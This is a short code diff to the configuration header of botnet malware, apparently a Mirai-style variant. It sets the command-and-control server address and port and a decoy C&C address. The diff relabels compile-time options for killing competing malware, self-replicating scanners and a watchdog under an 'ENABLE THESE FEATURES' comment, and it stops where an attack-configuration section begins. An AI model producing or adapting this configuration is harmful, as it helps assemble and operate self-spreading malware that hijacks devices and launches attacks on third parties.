@@ -10,7 +10,7 @@
  * ============================================================================ */
 
 // C&C Server address (IP or domain)
-#define CNC_ADDR "0.0.0.0"
+#define CNC_ADDR "127.0.0.1"
 #define CNC_PORT 3778
 
 // Scan results callback
@@ -32,10 +32,10 @@
 #define FAKE_CNC_ADDR "176.123.26.89"
 #define FAKE_CNC_PORT 23
 
-// Compile-time options (define before including this header)
-// #define KILLER      // Enable competing malware killer
-// #define SELFREP     // Enable self-replication scanners
-// #define WATCHDOG    // Enable hardware watchdog maintenance
+// Compile-time options - ENABLE THESE FEATURES
+//#define KILLER      // Enable competing malware killer
+//#define SELFREP     // Enable self-replication scanners
+//#define WATCHDOG    // Enable hardware watchdog maintenance
 
 /* ============================================================================
  * ATTACK CONFIGURATION
